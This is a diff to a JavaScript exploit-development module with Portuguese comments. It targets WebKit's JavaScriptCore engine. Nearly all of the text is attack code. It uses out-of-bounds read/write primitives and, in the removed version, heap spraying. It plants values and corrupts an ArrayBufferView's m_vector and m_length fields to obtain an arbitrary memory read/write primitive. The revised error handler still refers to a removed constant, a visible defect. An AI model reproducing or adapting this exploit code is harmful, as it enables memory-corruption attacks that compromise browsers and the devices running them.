@@ -11,23 +11,21 @@ import {
 import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ============================================================
-// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO
+// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO (sem alterações)
 // ============================================================
 const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterFor0x6CAnalysis";
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-const TARGET_WRITE_OFFSET_0x6C = 0x6C; // Afetado pela escrita em 0x70
+const TARGET_WRITE_OFFSET_0x6C = 0x6C;
 const OOB_AB_GENERAL_FILL_PATTERN = 0xFEFEFEFE;
-const OOB_SCAN_FILL_PATTERN = 0xCAFEBABE;
+const OOB_SCAN_FILL_PATTERN = 0xCAFEBABE; 
 const OOB_AB_SNOOP_WINDOW_SIZE = 0x100;
 
 const LOW_DWORD_PATTERNS_TO_PLANT_AT_0x6C = [
     0xFEFEFEFE, 0xCDCDCDCD, 0x12345678, 0x00000000, 0xABABABAB,
     (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 2)
 ];
-
-// !!!!! IMPORTANTE: SUBSTITUA ESTE VALOR PELO STRUCTUREID REAL DE UM Uint32Array NA SUA PLATAFORMA !!!!!
-const EXPECTED_UINT32ARRAY_STRUCTURE_ID = 0xBADBAD00 | 25; // PLACEHOLDER ÓBVIO - PRECISA SER SUBSTITUÍDO
+// EXPECTED_UINT32ARRAY_STRUCTURE_ID removido temporariamente para focar no plantio
 
 
 // ============================================================
@@ -58,171 +56,107 @@ export async function executeRetypeOOB_AB_Test() { /* ... (Corpo completo como n
     logS3(`--- Teste de Análise da Escrita em 0x6C (Corrigido) Concluído ---`, "test", FNAME_TEST_RUNNER);
 }
 
+
 // ============================================================
-// FUNÇÃO DE INVESTIGAÇÃO COM SPRAY (v6)
+// FUNÇÃO DE INVESTIGAÇÃO (v7 - Simplificada para focar no controle de 0x68 e 0x6C)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_SPRAY_INVESTIGATE = "sprayAndInvestigate_v6";
-    logS3(`--- Iniciando Investigação com Spray (v6): Controle Total de m_vector e Identificação ---`, "test", FNAME_SPRAY_INVESTIGATE);
+    const FNAME_INVESTIGATE = "investigateControl_v7";
+    logS3(`--- Iniciando Investigação (v7): Controle de QWORDs em 0x68 e 0x6C ---`, "test", FNAME_INVESTIGATE);
 
-    const NUM_SPRAY_OBJECTS = 200; 
-    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8; 
-    const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58; 
-    
-    logS3(`   AVISO IMPORTANTE: O StructureID esperado para Uint32Array é: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}.`, "warn", FNAME_SPRAY_INVESTIGATE);
-    logS3(`     >>> SE ESTE VALOR (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}) NÃO FOR O StructureID REAL DE UM Uint32Array, A FASE DE PRÉ-SCAN NÃO FUNCIONARÁ CORRETAMENTE. <<<`, "critical", FNAME_SPRAY_INVESTIGATE);
-    logS3(`     >>> VOCÊ PRECISA ENCONTRAR O VALOR CORRETO E ATUALIZAR A CONSTANTE 'EXPECTED_UINT32ARRAY_STRUCTURE_ID' NO TOPO DO ARQUIVO. <<<`, "critical", FNAME_SPRAY_INVESTIGATE);
+    // Offsets de interesse
+    const OFFSET_0x68 = 0x68; // Potencial m_vector_low + m_vector_high
+    const OFFSET_0x6C = TARGET_WRITE_OFFSET_0x6C; // Potencial m_vector_high + (parte_alta_afetada_pela_corrupcao_0x70)
+    const OFFSET_0x70 = CORRUPTION_OFFSET_TRIGGER; // Potencial m_length + m_mode (ou parte alta de 0x6C afetada)
 
-
-    // ** Alvo para m_vector: Tentar fazer apontar para o início do oob_array_buffer_real (offset 0) **
-    // Para isso, m_vector (QWORD em 0x68) deve ser 0x00000000_00000000
-    const PLANT_MVECTOR_LOW_PART  = 0x00000000; // Para Mem[0x68] (parte baixa do m_vector)
-    const PLANT_MVECTOR_HIGH_PART = 0x00000000; // Para Mem[0x6C] (parte alta do m_vector, também é a parte baixa de TARGET_WRITE_OFFSET_0x6C)
-
-    let sprayedVictimObjects = [];
-    let preCorruptionCandidates = {}; 
+    // Valores que queremos plantar para ver se temos controle
+    const PLANT_VAL_0x68_LOW  = 0xAABBCCDD; // Para Mem[0x68-0x6B]
+    const PLANT_VAL_0x6C_LOW  = 0x11223344; // Para Mem[0x6C-0x6F] (que também é a parte alta do QWORD em 0x68)
+                                        // E também a parte baixa do QWORD em 0x6C que será afetada pela corrupção
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
             throw new Error("OOB Init ou primitivas R/W falharam.");
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_INVESTIGATE);
 
-        // 1. Heap Spraying
-        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
-        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
-            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
-            arr[0] = (0xFACE0000 | i); // Marcador único para cada array spraiado
-            sprayedVictimObjects.push(arr);
-        }
-        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
-        await PAUSE_S3(200);
-
-        // 2. Fase de Pré-Corrupção: Escanear por candidatos (OPCIONAL, mas útil se SID for conhecido)
-        // Esta fase é mais útil se EXPECTED_UINT32ARRAY_STRUCTURE_ID estiver correto.
-        // Por enquanto, vamos pular esta fase para simplificar e focar no plantio e corrupção.
-        logS3("FASE 2: Scan pré-corrupção pulado nesta versão (foco no plantio e offset 0x58).", "info", FNAME_SPRAY_INVESTIGATE);
-        preCorruptionCandidates[FOCUSED_VICTIM_ABVIEW_START_OFFSET.toString()] = {note: `Offset focado ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}, sem verificação prévia de SID.`};
-
-
-        // 3. Preparar oob_array_buffer_real e Acionar a Corrupção
-        // Preenche o buffer OOB com um padrão, EXCETO os locais que vamos plantar.
-        const m_vector_low_addr = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
-        const m_vector_high_addr = m_vector_low_addr + 4; // 0x6C (também TARGET_WRITE_OFFSET_0x6C)
-        
+        // 1. Preencher o buffer com um padrão conhecido, exceto os locais de plantio
+        logS3("FASE 1: Preenchendo buffer OOB com padrão.", "info", FNAME_INVESTIGATE);
         for (let i = 0; i < Math.min(0x100, oob_array_buffer_real.byteLength); i += 4) {
-            if (i === m_vector_low_addr || i === m_vector_high_addr || i === (m_vector_high_addr + 4) /*0x70*/ ) {
+            if (i === OFFSET_0x68 || i === OFFSET_0x6C || i === OFFSET_0x70 || i === (OFFSET_0x70 + 4) ) {
                 continue; 
             }
             try { oob_write_absolute(i, OOB_SCAN_FILL_PATTERN, 4); } catch(e) {}
         }
+
+        // 2. Plantar valores específicos nos offsets 0x68 e 0x6C
+        logS3("FASE 2: Plantando valores específicos:", "info", FNAME_INVESTIGATE);
+        oob_write_absolute(OFFSET_0x68, PLANT_VAL_0x68_LOW, 4);
+        logS3(`  Plantado ${toHex(PLANT_VAL_0x68_LOW)} em ${toHex(OFFSET_0x68)}`, "info", FNAME_INVESTIGATE);
         
-        // Plantar valores para TENTAR controlar m_vector do objeto em FOCUSED_VICTIM_ABVIEW_START_OFFSET (0x58)
-        logS3(`Plantando ${toHex(PLANT_MVECTOR_LOW_PART)} em ${toHex(m_vector_low_addr)} (para m_vector low).`, "info", FNAME_SPRAY_INVESTIGATE);
-        oob_write_absolute(m_vector_low_addr, PLANT_MVECTOR_LOW_PART, 4);
+        oob_write_absolute(OFFSET_0x6C, PLANT_VAL_0x6C_LOW, 4);
+        oob_write_absolute(OFFSET_0x6C + 4, 0x00000000, 4); // Zera a parte alta de 0x6C (que é o início de 0x70)
+        logS3(`  Plantado ${toHex(PLANT_VAL_0x6C_LOW)} na parte baixa de ${toHex(OFFSET_0x6C)} e 0x0 na parte alta.`, "info", FNAME_INVESTIGATE);
+
+        logS3("  Valores ANTES do trigger de corrupção em 0x70:", "info", FNAME_INVESTIGATE);
+        logS3(`    QWORD @${toHex(OFFSET_0x68)} (potencial m_vector): ${oob_read_absolute(OFFSET_0x68, 8).toString(true)} (Esperado: ${toHex(PLANT_VAL_0x6C_LOW,32,false)}_${toHex(PLANT_VAL_0x68_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
+        logS3(`    QWORD @${toHex(OFFSET_0x6C)} (alvo da corrupção): ${oob_read_absolute(OFFSET_0x6C, 8).toString(true)} (Esperado: 0x00000000_${toHex(PLANT_VAL_0x6C_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
+        logS3(`    QWORD @${toHex(OFFSET_0x70)} (onde o trigger escreve): ${oob_read_absolute(OFFSET_0x70, 8).toString(true)} (Esperado: 0x????????_00000000)`, "info", FNAME_INVESTIGATE);
+
+
+        // 3. Acionar a Corrupção Principal (escreve FFFFFFFF_FFFFFFFF em 0x70)
+        logS3(`FASE 3: Acionando corrupção em ${toHex(OFFSET_0x70)} com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_INVESTIGATE);
+        oob_write_absolute(OFFSET_0x70, CORRUPTION_VALUE_TRIGGER, 8);
         
-        logS3(`Plantando ${toHex(PLANT_MVECTOR_HIGH_PART)} em ${toHex(m_vector_high_addr)} (para m_vector high / low dword de 0x6C).`, "info", FNAME_SPRAY_INVESTIGATE);
-        oob_write_absolute(m_vector_high_addr, PLANT_MVECTOR_HIGH_PART, 4); 
-        oob_write_absolute(m_vector_high_addr + 4, 0x0, 4); // Zera parte alta de 0x6C (será sobrescrita para 0xFFFFFFFF pela corrupção)
+        // 4. Ler e verificar os valores
+        logS3("FASE 4: Verificando valores APÓS corrupção:", "info", FNAME_INVESTIGATE);
+        const val_0x68_after = oob_read_absolute(OFFSET_0x68, 8);
+        const val_0x6C_after = oob_read_absolute(OFFSET_0x6C, 8);
+        const val_0x70_after = oob_read_absolute(OFFSET_0x70, 8); // m_length + m_mode
+        const val_0x74_after = oob_read_absolute(OFFSET_0x70 + 4, 4); // Apenas m_mode (parte alta de 0x70)
+
+        logS3(`  QWORD @${toHex(OFFSET_0x68)} (potencial m_vector): ${val_0x68_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
+        logS3(`    (Esperado m_vector: ${toHex(PLANT_VAL_0x6C_LOW,32,false)}_${toHex(PLANT_VAL_0x68_LOW,32,false)} - este não deve mudar pela escrita em 0x70)`, "info", FNAME_INVESTIGATE);
         
-        logS3(`  Valor em ${toHex(TARGET_WRITE_OFFSET_0x6C)} (m_vector_high_addr) ANTES da corrupção trigger: ${oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8).toString(true)}`, "info", FNAME_SPRAY_INVESTIGATE);
-        logS3(`  Valor de m_vector (@${toHex(m_vector_low_addr)}) ANTES da corrupção trigger: ${oob_read_absolute(m_vector_low_addr, 8).toString(true)}`, "info", FNAME_SPRAY_INVESTIGATE);
-        logS3(`    (Esperado m_vector: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_SPRAY_INVESTIGATE);
+        logS3(`  QWORD @${toHex(OFFSET_0x6C)} (alvo da corrupção): ${val_0x6C_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
+        logS3(`    (Esperado 0x6C: 0xffffffff_${toHex(PLANT_VAL_0x6C_LOW,32,false)})`, "info", FNAME_INVESTIGATE);
 
-        // Acionar a Corrupção Principal (escreve FFFFFFFF_FFFFFFFF em 0x70)
-        logS3(`Realizando escrita OOB em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        
-        const value_at_0x6C_after_corruption = oob_read_absolute(TARGET_WRITE_OFFSET_0x6C, 8);
-        logS3(`Valor em ${toHex(TARGET_WRITE_OFFSET_0x6C)} APÓS CORRUPÇÃO TRIGGER: ${value_at_0x6C_after_corruption.toString(true)} (Esperado: 0xffffffff_${toHex(PLANT_MVECTOR_HIGH_PART,32,false)})`, "leak", FNAME_SPRAY_INVESTIGATE);
+        logS3(`  QWORD @${toHex(OFFSET_0x70)} (potencial m_length + m_mode): ${val_0x70_after.toString(true)}`, "leak", FNAME_INVESTIGATE);
+        logS3(`    (Esperado 0x70: 0xffffffff_ffffffff pela escrita direta)`, "info", FNAME_INVESTIGATE);
 
-        // 4. Fase de Pós-Corrupção: Investigar o offset focado
-        logS3(`FASE 4: Investigando o offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE);
-        
-        const victim_base = FOCUSED_VICTIM_ABVIEW_START_OFFSET;
-        let struct_id_after, abv_vector_after, abv_length_after, abv_mode_after;
-        const sid_offset = victim_base + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET; // 0x58
-        const vec_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;     // 0x68
-        const len_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;     // 0x70
-        const mode_offset = victim_base + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;    // 0x74
+        const potential_m_length = val_0x70_after.low(); // m_length estaria na parte baixa do QWORD em 0x70
+        const potential_m_mode   = val_0x70_after.high(); // m_mode estaria na parte alta do QWORD em 0x70 (ou seja, val_0x74_after)
 
-        try { struct_id_after = oob_read_absolute(sid_offset, 4); } catch(e) {}
-        try { abv_vector_after = oob_read_absolute(vec_offset, 8); } catch(e) {}
-        try { abv_length_after = oob_read_absolute(len_offset, 4); } catch(e) {}
-        try { abv_mode_after = oob_read_absolute(mode_offset, 4); } catch(e) {}
-            
-        logS3(`    Resultados para offset base ${toHex(victim_base)} APÓS corrupção:`, "info", FNAME_SPRAY_INVESTIGATE);
-        logS3(`      StructureID (@${toHex(sid_offset)}): ${toHex(struct_id_after)}`, "leak", FNAME_SPRAY_INVESTIGATE);
-        logS3(`      m_vector    (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : toHex(abv_vector_after)} (Plantado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_SPRAY_INVESTIGATE);
-        logS3(`      m_length    (@${toHex(len_offset)}): ${toHex(abv_length_after)} (Decimal: ${abv_length_after})`, "leak", FNAME_SPRAY_INVESTIGATE);
-        logS3(`      m_mode      (@${toHex(mode_offset)}): ${toHex(abv_mode_after)}`, "leak", FNAME_SPRAY_INVESTIGATE);
+        logS3(`    Detalhes para objeto hipotético em 0x58:`, "info", FNAME_INVESTIGATE);
+        logS3(`      m_vector (lido de @0x68): ${val_0x68_after.toString(true)}`, "info", FNAME_INVESTIGATE);
+        logS3(`      m_length (lido de @0x70): ${toHex(potential_m_length)} (Decimal: ${potential_m_length})`, "info", FNAME_INVESTIGATE);
+        logS3(`      m_mode   (lido de @0x74): ${toHex(potential_m_mode)}`, "info", FNAME_INVESTIGATE);
 
-        if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF) {
-            logS3(`    !!!! ACHADO PROMISSOR em ${toHex(victim_base)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_length em ${toHex(len_offset)} CORROMPIDO para 0xFFFFFFFF!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-            logS3(`      m_vector atual: ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : toHex(abv_vector_after)}`, "vuln", FNAME_SPRAY_INVESTIGATE);
-            document.title = `Spray: ACHADO m_length @${toHex(victim_base)}`;
+        if (potential_m_length === 0xFFFFFFFF) {
+            logS3(`    !!!! ACHADO PROMISSOR !!!! m_length em ${toHex(OFFSET_0x70)} é 0xFFFFFFFF!`, "vuln", FNAME_INVESTIGATE);
+            logS3(`      m_vector associado (de @0x68) é ${val_0x68_after.toString(true)}.`, "vuln", FNAME_INVESTIGATE);
+            document.title = `CONTROLE? m_vec=${val_0x68_after.toString(true)}, m_len=FFFFFFFF`;
 
-            // --- TENTATIVA EXPERIMENTAL DE USAR O ARRAY CORROMPIDO ---
-            // AVISO: Esta parte é de ALTO RISCO e pode causar CRASH.
-            // Requer que um dos `sprayedVictimObjects` seja de fato o objeto em `victim_base`
-            // E que `abv_vector_after` aponte para uma área de memória válida e útil (ex: 0).
-            /*
-            if (isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === 0 && abv_vector_after.high() === 0) {
-                logS3("    m_vector parece ser 0. Tentando encontrar e usar o Uint32Array corrompido...", "warn", FNAME_SPRAY_INVESTIGATE);
-                let foundAndUsed = false;
-                for (let i = 0; i < sprayedVictimObjects.length; i++) {
-                    try {
-                        // Como identificar o array correto sem addrof? Não é trivial.
-                        // Vamos tentar um acesso em um objeto pulverizado, assumindo que é o correto.
-                        // Esta é uma suposição muito forte.
-                        if (i === 0) { // Teste apenas com o primeiro por segurança (EXEMPLO)
-                            logS3(`      Testando sprayedVictimObjects[${i}] (marcador: ${toHex(sprayedVictimObjects[i][0])}) ...`, "info", FNAME_SPRAY_INVESTIGATE);
-                            // Tenta ler/escrever em um offset pequeno, mas fora do limite original
-                            const test_idx = SPRAY_TYPED_ARRAY_ELEMENT_COUNT + 4; // ex: 8 + 4 = 12
-                            const original_value_if_readable = oob_read_absolute(test_idx * 4, 4); // Lê do oob_buffer se m_vector=0
-                            
-                            logS3(`        Escrevendo 0xDEADBEEF em sprayedVictimObjects[${i}][${test_idx}]...`, "info", FNAME_SPRAY_INVESTIGATE);
-                            sprayedVictimObjects[i][test_idx] = 0xDEADBEEF;
-                            
-                            const read_back = oob_read_absolute(test_idx * 4, 4);
-                            logS3(`        Lido de volta do oob_buffer @offset ${toHex(test_idx*4)}: ${toHex(read_back)}`, "leak", FNAME_SPRAY_INVESTIGATE);
-
-                            if (read_back === 0xDEADBEEF) {
-                                logS3(`        SUCESSO! Leitura/Escrita OOB através de sprayedVictimObjects[${i}] parece funcionar!`, "vuln", FNAME_SPRAY_INVESTIGATE);
-                                document.title = "ARR_CORROMPIDO USÁVEL!";
-                                // Restaurar valor original
-                                oob_write_absolute(test_idx * 4, original_value_if_readable, 4);
-                                foundAndUsed = true;
-                                break; 
-                            } else {
-                                logS3(`        Falha na verificação de R/W OOB (esperado DEADBEEF, obtido ${toHex(read_back)})`, "error", FNAME_SPRAY_INVESTIGATE);
-                            }
-                        }
-                    } catch (e_access) {
-                        logS3(`        Erro ao tentar usar sprayedVictimObjects[${i}]: ${e_access.message}`, "warn", FNAME_SPRAY_INVESTIGATE);
-                    }
-                }
-                if (!foundAndUsed) {
-                    logS3("    Não foi possível usar especulativamente um objeto Uint32Array pulverizado para R/W OOB.", "info", FNAME_SPRAY_INVESTIGATE);
+            if (val_0x68_after.low() === PLANT_VAL_0x68_LOW && val_0x68_after.high() === PLANT_VAL_0x6C_LOW) {
+                logS3("      SUCESSO NO CONTROLE DE M_VECTOR! Aponta para o valor plantado.", "good", FNAME_INVESTIGATE);
+                if (val_0x68_after.low() === 0 && val_0x68_after.high() === 0) {
+                    logS3("        E m_vector é ZERO! Primitiva de R/W sobre oob_array_buffer_real com tamanho gigante é provável!", "vuln", FNAME_INVESTIGATE);
+                    document.title = "R/W ARBITRÁRIO PROVÁVEL!";
                 }
             } else {
-                logS3("    m_vector não é 0. Usar o array corrompido diretamente requer mais análise do valor do m_vector.", "info", FNAME_SPRAY_INVESTIGATE);
+                logS3("      AVISO: m_vector não corresponde exatamente aos valores plantados. Investigar.", "warn", FNAME_INVESTIGATE);
             }
-            */
-            // --- FIM DA TENTATIVA EXPERIMENTAL ---
         }
-        logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);
+        logS3("INVESTIGAÇÃO DE CONTROLE CONCLUÍDA.", "test", FNAME_INVESTIGATE);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
+        logS3(`ERRO CRÍTICO na investigação de controle: ${e.message}`, "critical", FNAME_INVESTIGATE);
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
-        document.title = "Spray & Investigate FALHOU!";
+        document.title = "Investigação Controle FALHOU!";
     } finally {
-        sprayedVictimObjects = [];
         clearOOBEnvironment();
-        logS3("--- Investigação com Spray (v6) Concluída ---", "test", FNAME_SPRAY_INVESTIGATE);
+        logS3("--- Investigação de Controle (v7) Concluída ---", "test", FNAME_INVESTIGATE);
     }
 }
 
